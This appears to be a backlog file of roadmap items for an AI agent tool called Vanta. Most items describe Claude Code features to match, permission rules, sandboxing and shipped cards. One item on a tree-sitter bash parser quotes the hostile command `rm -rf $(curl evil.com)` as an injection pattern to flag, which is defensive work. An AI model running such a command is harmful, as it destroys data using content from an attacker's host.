items.summary: `.dxt` file format (from `@anthropic-ai/mcpb`) packages an MCP server manifest + assets into a single installable file. `claude install <path>.dxt` validates the manifest and configures the MCP server. Enables one-click MCP server installation from file or URL.
items.done: Installing a .dxt file validates the manifest, mounts the MCP server in settings, and makes its tools available in the next session; invalid manifests are rejected with field-level errors.

items.title: Plugin marketplace — multi-source plugin registry with local cache
items.summary: Marketplace manager supports multiple sources (URL, GitHub repo, npm package, local file). Manifests are cached in ~/.claude/plugins/marketplaces/ for offline access. `known_marketplaces.json` tracks all configured sources. Used by /plugin UI to browse and install from any source.
items.done: User can add a marketplace URL; manifest downloads and caches; /plugin shows marketplace entries; GitHub repo marketplaces are cloned; offline installs use cache.

items.title: .claude/agents/ — custom agent definitions from markdown files
items.summary: Load custom agent definitions from .claude/agents/*.md. Frontmatter declares effort, allowed tools, MCP servers, tool filters, description. Like skills but specifically for spawning as named sub-agents via @AgentType mention in prompts.
items.done: Files in .claude/agents/ appear in @-completions and can be spawned as named sub-agents; frontmatter fields (effort, tools, description) parsed and applied.

items.title: Auto skill improvement — periodic LLM review of invoked skills from session turns
items.summary: Post-sampling hook fires every N turns to review which skills were invoked, compares against recent messages with a small/fast model, and generates targeted skill updates (section, change, reason). Improves skills organically from actual usage patterns without disrupting the main flow.
items.done: After N turns with skill invocations, skill content is automatically refined; updates scoped to specific sections; uses a small/fast model to minimize cost; non-blocking.

items.title: Plugin dependency resolution — apt-style presence guarantees with cycle detection
items.summary: Plugins can declare dependencies on other plugins. Resolution: DFS walk at install time with cycle detection; load-time `verifyAndDemote` demotes plugins with unsatisfied deps (session-local, no settings write). Cross-marketplace deps blocked. Bare dep names inherit declaring plugin's marketplace.
items.done: Installing plugin A with dep on B installs B first; circular deps rejected at install time; if B is removed, A is demoted (not errored) at load time.

items.title: MonitorMcpTask — background MCP monitoring task (MONITOR_TOOL gate)
items.summary: MonitorMcpTask is a background task type for monitoring MCP server output. Gated behind MONITOR_TOOL feature flag. Enables the Monitor tool to run background MCP watchers that fire callbacks when conditions are met.
items.done: A Monitor tool call creates a MonitorMcpTask running in the background; task visible in footer; fires callback on condition; cancellable.

items.title: Swarm idle notification — teammate sends idle state to leader on Stop
items.summary: When a teammate agent's session stops, CC's `teammateInit` module fires a Stop hook that writes an idle notification to the team leader's mailbox. The leader polls the mailbox and updates the teammate's status in the team UI (showing it as idle rather than running). Includes the last peer-DM summary for context.
items.done: When a worker completes its task, the leader's team view shows the worker as 'idle'. The leader can assign new work or clean up the team.

items.title: LocalWorkflowTask — workflow script task type (WORKFLOW_SCRIPTS gate)
items.summary: LocalWorkflowTask is a task type that runs a workflow script (multi-agent orchestration). Gated behind the WORKFLOW_SCRIPTS feature flag. Enables the Workflow tool to spawn structured multi-step agent workflows tracked in the task list.
items.done: Running a workflow script creates a LocalWorkflowTask visible in the task list; progress tracked; workflow completion shows results.

items.title: Git worktree tool — isolated branch workspaces
items.summary: CC has EnterWorktreeTool/ExitWorktreeTool: create a git worktree for isolated parallel work (each agent gets its own branch+directory, auto-cleaned if unchanged). Useful for multi-agent builds where agents edit different files concurrently without conflicts. Add enter_worktree / exit_worktree tools, kernel-gated (creates a new git scope).
items.done: `enter_worktree` / `exit_worktree` let the agent work in an isolated git worktree; auto-cleanup on exit.

items.title: Bash auto-classifier — ML-based auto-approval for safe bash commands
items.summary: CC runs an async classifier against every bash command before surfacing a permission dialog. Coordinator workers await the result sequentially; swarm workers try it before forwarding to the leader. Races against user interaction with a resolve-once guard.
items.done: Bash commands classified as safe auto-approve without dialog; unsafe/unknown fall through to normal permission flow; coordinator and swarm workers respect classifier result.

items.title: /batch — parallel multi-agent code implementation skill
items.summary: Bundled /batch skill that orchestrates a large parallelizable codebase change across 5–30 worker agents in git worktrees. Each worker implements one change, runs tests, and creates a PR. Coordinator tracks PR URLs. Uses EnterPlanMode + AgentTool.
items.done: Running /batch with a description spawns multiple worker agents in isolated worktrees; each worker creates a PR; coordinator reports PR URLs on completion; test failures are fixed before PR creation.

items.title: Tmux swarm backend — spawn agents in tmux panes with locking + color coding
items.summary: Spawns CC agents in separate tmux panes. Sequential pane creation lock prevents race conditions. 200ms shell init delay for starship/oh-my-zsh. Leader pane cached for performance. SWARM_SESSION_NAME/HIDDEN_SESSION_NAME constants. Agents identified by color from team palette.
items.done: Running /team spawns agents in tmux panes; each pane auto-labeled with agent color; panes created sequentially without races; shell ready before agent starts.

items.title: Plan mode v2 — multi-agent plan execution (Max=3 agents, enterprise=3)
items.summary: CC's plan mode v2 (`getPlanModeV2AgentCount`) spawns multiple parallel agents during plan execution. Max 20x subscribers and enterprise/team users get 3 concurrent plan agents; others get 1. The count is GrowthBook-configurable and has a `CLAUDE_CODE_PLAN_V2_AGENT_COUNT` env override (1-10). Also includes `getPlanModeV2ExploreAgentCount` (default 3, env override) — dedicated exploration/research agents that run in parallel before main plan execution.
items.done: On a Max plan, entering plan mode and running `/plan` spawns 3 concurrent sub-agents for different plan steps. Progress shows all 3 working in parallel.

items.title: Session memory compact — compact into persistent session memory files (not just summary)
items.summary: An experimental compaction variant (`sessionMemoryCompact`) that compacts the conversation into structured session memory files (`.claude/session-memory/`) rather than a plain summary message. On the next session, the memory is loaded to restore context. Tracks tool names seen since last compact via `extractDiscoveredToolNames`.
items.done: After compaction, key facts persist to `.vanta/session-memory.md`. On `/resume`, the memory is injected as context so the agent recalls prior decisions.

items.title: UDS peer agents — `/peers` command and ListPeersTool for agent discovery via Unix sockets
items.summary: CC (feature-gated `UDS_INBOX`) supports peer agent discovery and communication via Unix Domain Sockets. `/peers` lists visible peer agents; `ListPeersTool` gives the agent programmatic access to discover and address peers. Distinct from swarm mailbox messaging (file-based) — UDS provides lower-latency IPC for agents running on the same machine.
items.done: `/peers` lists other CC sessions running on the machine. An agent can call `list_peers` and then `send_message` to an agent ID to collaborate across sessions.

items.title: Templates — prompt classification and template injection for common task patterns
items.summary: CC (feature-gated `TEMPLATES`) classifies prompts into job templates using a `jobClassifier` at query time. Templates are loaded from a `templates/` directory alongside agents/commands in plugin manifests. Enables pre-structured prompts for common workflows.
items.done: Prompts matching known patterns (e.g. 'fix bug', 'write test') are classified and augmented with template context before being sent to the model.

items.title: Deep link protocol — claude-cli:// URL opens CC with pre-filled context
items.summary: Registers the `claude-cli://` URL scheme. Opening `claude-cli://open?q=fix+tests&repo=owner/repo` opens a new terminal window with CC, pre-filling the prompt and working directory. Used for 'open in terminal' integrations from claude.ai and IDE extensions. Security: control char filtering, shell-escaping at injection boundary. Feature flag: `LODESTONE`.
items.done: Clicking a claude-cli:// link opens a terminal with CC; prompt is pre-filled; working directory set from cwd/repo params; control characters in params are rejected.

items.title: Slack channel autocomplete — `#channel` mention suggestions in prompt input
items.summary: CC's prompt input suggestion overlay supports a `slack-channel` suggestion type, enabling `#channel-name` autocomplete when the user types `#` in the prompt. Integrates with the Slack channel suggestion service (`slackChannelSuggestions.ts`) to fetch accessible channels. Used in organizations with Slack integration enabled.
items.done: Typing `#eng` in the prompt shows matching Slack channels as suggestions. Selecting one inserts the channel reference for context or notification routing.

items.title: Bidirectional text — RTL/LTR mixing in TUI output
items.summary: CC's ink/bidi.ts handles bidirectional text (Hebrew, Arabic, mixed RTL/LTR) for correct rendering order in the terminal. Required for proper display when agents work with RTL-language content or codebase comments in RTL languages. Vanta's renderer assumes LTR.
items.done: Text blocks with RTL characters render with correct bidi ordering; mixed RTL/LTR paragraphs use the Unicode Bidi Algorithm; terminal width calculations account for bidi reordering.

items.title: Terminal panel + TerminalCaptureTool — agent captures terminal content, Meta+J toggle
items.summary: CC (feature-gated `TERMINAL_PANEL`) adds a `TerminalCaptureTool` letting the agent read the current terminal buffer content, plus an embedded terminal panel toggled with `Meta+J` (`app:toggleTerminal`). The agent can 'see' what's on screen without a screenshot.
items.done: `Meta+J` opens a terminal panel. The agent can call `terminal_capture` to read current terminal output as text context, useful for debugging TUI apps.

items.title: Agent creation wizard — guided multi-step agent definition UI
items.summary: CC has a full guided wizard for creating custom named agents: 12 steps (Type, Method, Color, Description, Memory, Model, Tools, Prompt, Generate, Location, Confirm, ConfirmWrapper). Each step is a dedicated screen with keyboard navigation. Agents are saved as typed config files. No equivalent in Vanta.
items.done: /new-agent (or vanta agents new) launches the wizard; each step validates before advancing; the finished agent is saved to ~/.vanta/agents/ and immediately available as a delegate target.

items.title: Global search dialog — search across all sessions and messages
items.summary: CC's GlobalSearchDialog (Ctrl+K or similar) searches across all stored sessions and messages, showing ranked results with session context. Vanta has per-session search and SESSION-SEARCH (shipped) for session listing, but no full-text cross-session search UI.
items.done: Ctrl+K opens the global search overlay; results show session name + date + matched message excerpt; Enter opens the session at the match; Esc dismisses; results are ranked by recency + relevance.

items.title: Mouse support — click events, hit testing, focus in TUI
items.summary: CC's ink layer has full mouse support: click-event.ts, hit-test.ts, focus-event.ts, terminal-event.ts — elements can declare click handlers and receive mouse focus. Enables clickable links, buttons, and list items in the TUI. Vanta's Ink TUI is keyboard-only.
items.done: Terminal mouse events are captured; UI elements register hit areas; clicking a link, button, or list item triggers its handler; focus follows click; mouse can be disabled for performance.

items.title: TUI design system — Byline, Dialog, Divider, FuzzyPicker, ProgressBar, Ratchet, Tabs, themed components
items.summary: CC has a full internal design system for the TUI: Byline (attribution line), Dialog (modal container), Divider (horizontal rule), FuzzyPicker (generic fuzzy picker), ProgressBar (bounded progress indicator), Ratchet (progressive disclosure), Tabs (tabbed pane), ThemedBox/ThemedText (theme-aware wrappers), color token system. Vanta uses raw Ink primitives ad-hoc.
items.done: A vanta-ts/src/tui/design-system/ module exports all core primitives; all existing dialogs/pickers/panels are refactored to use them; theme tokens control colors from settings.

items.title: Channel permission relay — approve permissions via Telegram/iMessage/Discord
items.summary: When CC hits a permission dialog, it also sends the prompt to connected channels (Telegram, iMessage, Discord). User replies 'yes <request_id>' via the channel; CC receives it as a structured notification and races it against local UI. First resolver wins. Allowlist-gated per server. Requires channel MCP server supporting `claude/channel/permission` capability.
items.done: Permission dialogs arrive in connected messaging channels; replying 'yes <id>' approves without opening the terminal; local UI still works in parallel.

items.title: `claude ssh` — remote session over SSH with SSHSessionManager
items.summary: CC supports a `claude ssh` command that creates an SSH-based remote session (sibling to `claude --remote` WebSocket sessions). The SSH child process and auth proxy are created at startup and handed to `useSSHSession`. The hook bridges SSH session messages into the REPL UI using the same SDK message adapters as remote WebSocket sessions.
items.done: `claude ssh user@host` opens an interactive session over SSH. Tool calls execute on the remote host; permission prompts appear locally.

items.title: Auto memory extraction — background LLM extraction of facts from session turns
items.summary: CC has a feature-gated (`EXTRACT_MEMORIES`) background service that analyzes session turns after completion and extracts durable facts/preferences into a persistent memory store. Different from skill improvement — this extracts user facts and context rather than improving tool skills.
items.done: After a session, relevant facts ('user prefers TypeScript strict mode', 'project uses pnpm') are extracted and stored. Future sessions automatically include relevant memories as context.

items.title: Push-to-talk voice input — native CoreAudio/cpal + SoX/arecord fallback
items.summary: CC records microphone audio for voice input using a native NAPI module (`audio-capture-napi`) backed by CoreAudio on macOS, with lazy-loading (~1s first-press delay). Falls back to SoX `rec` or ALSA `arecord` on Linux. Audio is recorded while the key is held, then transcribed. The native module is loaded lazily to avoid blocking startup.
items.done: Holding the voice keybinding records audio. On release, it transcribes and submits as a prompt. `/voice status` shows whether native audio or fallback is active.

items.title: ReviewArtifactTool — review and approve generated code/file artifacts in UI
items.summary: CC (feature-gated `REVIEW_ARTIFACT`) has a `ReviewArtifactTool` with a dedicated `ReviewArtifactPermissionRequest` component. The tool presents a generated artifact (code file, document) for user review with approve/reject. Shows a diff-style view of the proposed artifact before it's written.
items.done: When the agent proposes a new file, a ReviewArtifact dialog shows the full content with an approve/reject choice before it's written to disk.

items.title: Plan mode interview phase — clarifying questions before plan execution
items.summary: CC plan mode v2 has an 'interview phase' (`isPlanModeInterviewPhaseEnabled`, gate `tengu_plan_mode_interview_phase`) that runs before plan execution. CC asks clarifying questions to refine the plan scope, constraints, and approach before spawning sub-agents. Prevents wasted work from misunderstood requirements.
items.done: Entering plan mode shows a question phase: 'Before I plan this, I need to clarify: [questions]'. User answers, then CC generates the refined plan and executes it.

items.title: Computer use via MCP (CHICAGO) — route computer-use tool calls through MCP server
items.summary: CC (feature-gated `CHICAGO_MCP`) enables computer use tool calls to be handled by a dedicated MCP server (codename CHICAGO) rather than natively. Checks `isComputerUseMCPServer`, runs `cleanupComputerUseAfterTurn` after each turn, and sets up the COMPUTER_USE_MCP_SERVER_NAME. Enables GUI automation via the MCP protocol.
items.done: With `CHICAGO_MCP` and a computer-use MCP server configured, CC routes screenshot/click/type tool calls to the MCP server. macOS-specific setup runs at startup.

items.title: Survey: what THEFT/Paperclip needs from Vanta as its operator engine
items.summary: Read THEFT AI's BUILD-FROM-THIS (SOURCE-OF-TRUTH, PARITY-DELTA, ROADMAP) and Paperclip's runtime contract; produce the card set for Vanta-as-engine: what the company-OS needs (multi-agent departments, heartbeat-style runs, approvals at company scale, skills exchange) that Vanta doesn't yet provide. Engine only — product surfaces stay in the THEFT repo (STRATEGY.md pillar 5).
items.done: A reviewed list of concrete Vanta cards (or an explicit 'nothing missing') filed under the Cofounder engine track, each traceable to a THEFT need.

items.title: Tree-sitter bash parser — AST-accurate security validation for bash commands
items.summary: CC (feature-gated `TREE_SITTER_BASH`) uses a tree-sitter-based AST parser for bash commands alongside (or replacing) the regex parser. Provides structurally accurate analysis of compound commands, pipelines, subshells — catching injection patterns that regex misses. `TREE_SITTER_BASH_SHADOW` runs both and compares for gradual rollout.
items.done: With tree-sitter bash enabled, `rm -rf $(curl evil.com)` is correctly parsed as a command substitution and flagged. Regex shadow mode logs discrepancies.

items.title: Self-hosted runner — dedicated entrypoint for running CC as a CI/CD runner
items.summary: CC (feature-gated `SELF_HOSTED_RUNNER`) adds a `self-hosted-runner` CLI entrypoint that bypasses the interactive REPL and enters a dedicated runner mode. Designed for running CC as an automated agent in CI/CD pipelines with job-queue polling.
items.done: Running `claude self-hosted-runner` starts a job-polling loop. Incoming jobs from the queue are executed as CC sessions and results posted back.

items.title: SSH pre-configured connections in settings
items.summary: CC's sshConfigs setting pre-configures named SSH connections (host, port, user, key, jump host) so the agent can SSH into remote systems without user config. Useful for remote dev environments, cloud instances, and cross-machine agent tasks.
items.done: sshConfigs accepts an array of named connection profiles; the shell_cmd / bash tools use them by name; `vanta ssh <name>` opens an interactive shell to the configured host.

items.title: GitHub integration
items.summary: CC: /install-github-app, GitHub Actions CI, PR status badges, --from-pr. Needs a hosted GitHub App; Vanta has local git tools + a webhook gateway.
items.done: Out of scope for a local, provider-agnostic, kernel-gated operator; revisit only if Vanta grows this surface.

items.title: Slack app
items.summary: CC: /install-slack-app, trigger Claude from Slack. Vanta proves the messaging-adapter pattern with Telegram (others planned in the messaging registry).
items.done: Out of scope for a local, provider-agnostic, kernel-gated operator; revisit only if Vanta grows this surface.

items.title: Structured diff renderer — color diff, file list, detail view
items.summary: CC has StructuredDiff (colorized inline diff with context lines), StructuredDiffList, DiffDetailView (expandable hunk view), DiffDialog, and DiffFileList (multi-file diff navigator). The /diff command uses these. CC-DIFF-VIEWER (shipped) covers the basic /diff command; Vanta is missing the proper color diff renderer and file-list navigator.
items.done: File edits render with color-diff (red/green lines, context collapse); /diff opens a multi-file navigator with DiffFileList; DiffDetailView shows individual hunks with expand/collapse.

items.title: Desktop P12 — native Electron packaging
items.summary: Phase 12: native Electron shell under vanta-ts/desktop-app/ that launches the local Vanta server + opens a native window, clean lifecycle. Package/sign only after Jason approves the UX.
items.done: A dev native window opens and drives Vanta with clean open/close/restart; signing deferred until UX is approved.

items.title: Full life/world command center (all dashboards)
items.summary: wants3 Phase 3, full version: the complete multi-dashboard command center -- Today, Life Admin, Money, Escape Plan, Projects, Sales Pipeline, Content/Marketing, Creative System, Learning, Memory/Reflection. Platform-scale -> horizon; Jason's own rule is 'do not build full JARVIS at once.' First slices ship as BRIEF-CMD + MONEY-OS; the rest lands once the manual loops prove out.
items.done: First slice covered by BRIEF-CMD + MONEY-OS; this closes when the remaining 8 dashboards render from LIFE-OS-SCHEMA in one surface.

items.title: World model of Jason's systems
items.summary: A map of how Jason's digital life fits together -- repos, services, domains, tools, configs, recurring bugs (wants1 #14). Platform-scale; horizon until a real need pulls it. Extends PROJ-IDENTITY + MEM-WORKTREE + MEM-GRAPH from per-project to cross-system. Scoped to a first slice only: index the _active/ repos + their stacks.
items.done: First slice: Vanta names every repo under _active/, its stack, and its last-known state from a stored system map (not the full digital-life graph).

items.title: Life-wide semantic search
items.summary: 'Find the thing where I wrote about operator aesthetics' across notes, repos, emails, docs, chats -- return the real source, not vague memory (wants1 #17). Extends MEM-VERBATIM (Vanta's own verbatim archive + semantic search) from internal memory to external corpora. Platform-scale -> horizon. First slice: repos + Vanta memory only.
items.done: First slice: a natural-language query returns the actual file+line across indexed repos and Vanta memory, with the source shown.

items.title: Ambient context (know what you're looking at)
items.summary: Understand what app/page/file Jason is looking at and help without him restating everything -- 'I see the error; here's the likely fix' (wants1 #8). Extends O3 look_at_screen from on-demand to ambient. Needs OS-level integration -> horizon. First slice: active-file/window awareness in the dev loop.
items.done: First slice: Vanta states the currently-focused file/window and offers a relevant next step without being told what it is.

items.title: Desktop app for Vanta
items.summary: Umbrella for the native Vanta desktop app. The rough localhost web shell exists (vanta desktop); the full build is DESKTOP-P0..P12 (Electron-first foundation, kernel-enforced) per docs/desktop-completion-plan.md. NOT a generic dashboard — match interaction model first, then Vanta's operator/dossier aesthetic.
items.done: Closes when DESKTOP-P0..P12 ship: a native Electron Vanta app with streaming chat, sessions, approval-first actions, model control, file/terminal/preview rails, palette + command center.

items.title: Mine Goose/Reference for stealable patterns
items.summary: Targeted read of the Goose and Reference codebases for specific stealable patterns (adapt, not copy). was already mined for v1 - see docs/parity-audit.md and -map.html before re-doing that work.
items.done: A short adapt/cant/missing/cut analysis per source; worthwhile patterns become roadmap items.

items.title: Setup/install UX parity
items.summary: Audit the setup wizard + install flow against best-in-class one-command installs (one-line bootstrap.sh already exists). Smooth first-run to first-value.
items.done: A new user goes from install to a working session in one command + one setup step.

items.title: Secrets (Bitwarden Secrets Manager)
items.summary: DECLINED (evidence/thesis): Secrets (Bitwarden Secrets Manager). Vanta: `.env` + gitleaks pre-commit. External secret source = platform-thinking. See docs/vanta-what-to-build.html for why this is parked, not built.
items.done: Not built unless real demand proves otherwise — External secret source = platform-thinking.

items.title: Isolated profiles (full VANTA_HOME each)
items.summary: DECLINED (evidence/thesis): Isolated profiles (full VANTA_HOME each). Vanta: rooms (per-project goal streams). Multi-tenancy before users; rooms = 80%. See docs/vanta-what-to-build.html for why this is parked, not built.
items.done: Not built unless real demand proves otherwise — Multi-tenancy before users; rooms = 80%.

items.title: Computer-use (cua-driver, desktop control)
items.summary: DECLINED (evidence/thesis): Computer-use (cua-driver, desktop control). Vanta: browser tools + screenshot/vision. Horizon; browser covers web. Big lift.. See docs/vanta-what-to-build.html for why this is parked, not built.
items.done: Not built unless real demand proves otherwise — Horizon; browser covers web. Big lift..

items.title: Output style picker UI — in-TUI style switcher
items.summary: CC's OutputStylePicker renders an interactive in-TUI list of available output styles (default + custom from settings) with live preview. Pairs with CC-OUTPUT-STYLE (next) for the /output-style command. Vanta needs the visual picker to make the feature usable.
items.done: /output-style opens the picker; arrow keys preview each style; Enter applies; the active style shows in the status line; custom styles defined in settings appear alongside built-ins.

items.title: useShortcutDisplay — render user-configured keybinding hints in UI
items.summary: React hook and non-React function that return the display text for any action+context pair from the user's live keybinding config. Used in help overlays, confirmation dialogs, and typeahead footers so shown shortcuts always match the user's custom config.
items.done: Keyboard hints in help overlays and dialogs show the user's configured binding, not hardcoded defaults; non-React callers (commands, services) use the sync variant.

items.title: Vim visual mode — `v`/`V` selection with operators in the prompt input
items.summary: CC (v2.1.118) adds vim visual mode (`v` char-select, `V` line-select) with operators (d/y/c) and visual feedback in the prompt input. Extends the existing vim normal mode.
items.done: In vim mode, pressing `v` starts character selection. `d` deletes the selection; `y` yanks to register.

items.title: Markdown table rendering — GFM table support in terminal output
items.summary: CC's MarkdownTable renders GitHub-Flavored Markdown tables with aligned columns, borders, and header separators in the terminal. Vanta's markdown renderer (CC-S-MARKDOWN shipped) handles headers/bullets/code but not tables.
items.done: GFM table syntax renders as aligned terminal tables with column borders; wide tables wrap or scroll; empty cells and alignment directives (left/right/center) are respected.

items.title: WorkflowMultiselectDialog — multi-select UI for workflow steps
items.summary: CC's WorkflowMultiselectDialog lets users select which workflow steps to run, skip, or configure before launching a multi-agent workflow. Pairs with WORKFLOWS (shipped). Vanta runs workflows automatically without a step-selection UI.
items.done: Before a workflow runs, WorkflowMultiselectDialog shows all phases with checkbox selection; users can skip steps or reorder; confirmed steps proceed; skipped steps are logged as intentionally omitted.

items.title: Bundles (skill aliases)
items.summary: DECLINED (evidence/thesis): Bundles (skill aliases). Vanta: modes (skill groups). modes ≈ bundles. See docs/vanta-what-to-build.html for why this is parked, not built.
items.done: Not built unless real demand proves otherwise — modes ≈ bundles.

items.title: 169 bundled skills (74 + 95 optional)
items.summary: DECLINED (evidence/thesis): 169 bundled skills (74 + 95 optional). Vanta: ~26 bundled + design/ai libraries. 'Management beats count' — curate on demand. See docs/vanta-what-to-build.html for why this is parked, not built.
items.done: Not built unless real demand proves otherwise — 'Management beats count' — curate on demand.

items.title: Vision routes to a dedicated model
items.summary: SHIPPED 2026-06-05. routing/vision.ts (visionEnv + resolveVisionProvider); all 3 image tools (describe_image, look_at_screen, look_at_camera) route to VANTA_VISION_MODEL (+ optional VANTA_VISION_PROVIDER) when set, else the active provider. Fixes vision silently breaking on a text-only main model (DeepSeek V4 Flash, local Ollama). 4 unit tests, full suite green,.env.example + CLAUDE.md updated.
items.done: Vision works while the main model is non-vision (text-only VANTA_PROVIDER + VANTA_VISION_MODEL=gpt-4o-mini).

items.title: Trust calibration: verified / inferred / uncertain / needs-check
items.summary: SHIPPED 2026-06-07. Folded into prompt.ts rule 7 (honesty) rather than appending a new rule: 'Label claims by epistemic status — verified (tool-backed) / inferred / uncertain — so it's clear when you know vs guess; show an unverifiable claim as uncertain, not as flat fact.' prompt test locks the clause. Behavioral rendering on real replies is model-driven (verified live, like BEHAVIOR-VOICE).
items.done: A factual reply renders explicit verified/inferred/uncertain markers, and an unverifiable claim is shown as uncertain rather than stated flat.

items.title: Built-in code-size gate (industry-standard, always on)
items.summary: SHIPPED 2026-06-07. lint/size.ts: pure analyzeSource via the TS compiler API — file ≤300, function ≤50, params ≤4, cyclomatic complexity ≤10 (decision points incl. &&/||/??, not double-counting nested fns); each violation = file:line + metric + limit + fix. lint/run.ts + `vanta lint [files|--staged]` (default = all git-tracked.ts/.tsx; tests +.d.ts exempt). Pre-commit (scripts/pre-commit) now runs it on staged TS — WARN-ONLY by default (VANTA_LINT_BLOCK=1 to enforce) because a hard block would stop all commits: the gate surfaced 85 pre-existing violations (agent.ts 334L, cli.ts 401L, interactive.ts runChat 240L, providers/index.ts resolveProvider cx 24, …) — real debt for a follow-up 'size-debt paydown' card, not fixed here. 'Not just the factory' = the gate now serves human commits + `vanta lint`; the factory keeps its file-line born-small check. [in-agent, 2026-06-07] write_file now runs analyzeSource on every TS/TSX write and surfaces violations in the tool result (advisory, never blocks) so the AGENT writes born-small / self-corrects in-loop — closing the human+agent+factory triad. 10 unit tests; full suite 1210 green; tsc clean.
items.done: A commit or factory cycle with an oversized file/function/complexity is flagged by Vanta's own gate (not just the factory), reporting file:line + limit + fix; passing code commits clean.

items.title: Verification must prove the actual claim (not a proxy)
items.summary: SHIPPED 2026-06-07. Folded into prompt.ts rule 4 (completion): 'prove the ACTUAL claim (UI/behaviour: run it and observe; a green tsc/test proves it compiles, not that it works)'. prompt test locks the clause. Pairs with the rule-4 cite-the-evidence hardening from BEHAVIOR-VOICE.
items.done: A 'done' claim cites evidence that matches the claim (UI verified by running/observing, not by tsc); proxy-only verification is flagged, not accepted.

items.title: Strip /Claude/agent mentions from published code
items.summary: SHIPPED 2026-06-09. Stripped prior-agent lineage from all published source code, docs, roadmap, and CLAUDE.md. Functional bridge strings left intact (external binary calls). Old research archive deleted. Committed and pushed to main.
items.done: Published code and user-facing text carry no other-agent references; research docs deleted; git history clean.

items.title: Clean industry-standard plugin/capability install (no repo pollution)
items.summary: SHIPPED 2026-06-08. plugins/catalog.ts: PLUGIN_CATALOG (browser/whatsapp-bridge) with depsLocation/stateLocation/checkInstalled/install/remove, pluginById, formatPluginList, checkNoPluginFilesInRepo. vanta plugins [list|install|remove|check-repo] CLI. 5 tests; 1755 total; tsc clean.
items.done: 'vanta plugins' lists capabilities + where each one's deps/state live; 'vanta plugins install browser' fetches Chromium into the OS cache (never the repo); 'vanta doctor' confirms no plugin files in the project tree.

items.title: Messaging setup wizard (Telegram/iMessage/WhatsApp/Signal)
items.summary: SHIPPED 2026-06-05. 'vanta setup messaging' — registry-driven wizard (setup-messaging.ts). Configures Telegram for real (writes VANTA_TELEGRAM_TOKEN via the shared upsertEnv, other keys preserved); previews planned iMessage/WhatsApp/Signal with exact setup steps + prerequisites + risk warnings; honest [available/configured/planned] status per platform. 7 tests; full suite 1090 green; tsc clean.

items.title: Automatic per-task model routing + ephemeral subagents
items.summary: Keep the main brain on the selected premium model (e.g. codex/gpt-5.5) while Vanta automatically spins up scoped subagents on local/cloud models for bounded tasks -- summarize, classify, research, verify, memory compression, first-pass code inspection -- then tears the worker down (local Ollama unloads via keep_alive:'0s'). A ROUTER LAYER on top of delegate/swarm, not a new agent system: classifyTaskKind + resolveTaskRoute(env) + routeEnv, per-kind VANTA_ROUTE_* config, fail-soft to main, high-risk tasks (security/financial/irreversible/commits/kernel) forced to main. Adds an auto_delegate tool + /routes status + setup-wizard aux config; absorbs AUX-MAP as a slice. Full 4-slice build plan: docs/auto-router.md.
items.done: With the main model active, Vanta auto_delegates a low-risk subtask to a configured local/cloud worker (e.g. ollama/qwen2.5:14b), returns the output, unloads the local model, and synthesizes through the main brain; /routes shows the routing table + availability.

items.title: `ENABLE_PROMPT_CACHING_1H` — opt into 1-hour prompt cache TTL
items.summary: CC (v2.1.108) adds `ENABLE_PROMPT_CACHING_1H` to opt into a 1-hour prompt cache TTL (vs the default 5 minutes) on API key, Bedrock, Vertex, and Foundry. Dramatically reduces cost for long-running sessions.
items.done: With `ENABLE_PROMPT_CACHING_1H=1`, cache hits persist for 1 hour. A 2-hour session with a large system prompt sees >80% cache hit rate.
items.notes: Shipped. Caching already existed (ephemeral cache_control on the stable system prefix in providers/anthropic.ts); this gates the 1h TTL behind ENABLE_PROMPT_CACHING_1H (Claude Code's env name). toSystemBlocks stamps {type:ephemeral,ttl:1h} on the stable breakpoint + complete() adds the extended-cache-ttl-2025-04-11 beta header (combined with the OAuth beta when both apply). Off by default: 1h cache WRITE costs 2x base, so it only wins on long sessions with ~3+ reads/hour. Pure path unit-tested (toAnthropicMessages cache1h on/off + promptCache1hEnabled).

items.title: In-session permission rules (allow/ask/deny)
items.summary: Claude Code's /permissions manages allow/ask/deny rule lists. Vanta's kernel decides per-action but the user can't tune persistent rules in-session. Add user-editable allow/ask/deny lists (tool + arg patterns), persisted per project, that feed the kernel verdict. Rule zero holds: allow-rules may only downgrade Ask→Allow within kernel-permitted bounds, never override a Block.
items.done: /permissions shows current allow/ask/deny rules; the user can add a rule (e.g. allow read_file, deny 'shell rm *'); rules persist and the kernel honors them on later actions; a Block stays a Block regardless of an allow rule.
items.notes: SHIPPED 2026-06-10 (design-first: docs/design-cc-permissions.md → agent pure layer + parent security wiring). User-tunable allow/ask/deny rules layered on the kernel, TIGHTEN-only. permissions/rules.ts: pure matchRule(rules, tool, descriptor) (specificity: tool+pattern > tool > pattern > any; first-match) + tighten(kernelVerdict, ruleAction) — kernel "block" is IMMOVABLE (returns block for any rule), kernel "ask"+allow→allow / +deny→block, kernel "allow"+deny→block / +ask→ask. permissions/store.ts: ~/.vanta/permissions.tsv (auto-commits). /permissions list|allow|ask|deny <tool> [pattern]|remove <n>. Wired into agent/dispatch-helpers.ts applySafetyGate: decision = tighten(verdict.risk, matchRule(loadRules,...)); kernel approval queue reconciled ONLY when the kernel itself asked (rule-escalated asks just prompt; rule-allow auto-confirms a kernel ask). +35 tests incl. the exhaustive 3×4 tighten matrix (block-immovable) + a gate integration test (deny blocks / block immovable / allow auto-confirms). full suite 2153 green, tsc clean. Unblocks CC-AUTO-MODE + CC-PERM-PER-TOOL-UI.

items.title: OS sandbox for tool execution
items.summary: Claude Code's /sandbox runs tools under OS isolation (Linux bwrap). Add an opt-in sandbox for shell_cmd/run_code using macOS Seatbelt (sandbox-exec) and Linux bwrap, restricting filesystem + network to the approved scope. Reinforces the kernel thesis with OS-level enforcement.
items.done: With sandbox enabled, shell_cmd/run_code execute inside a Seatbelt/bwrap profile scoped to the project root + writable zones; an out-of-scope file or network access fails at the OS layer, verified by a test.
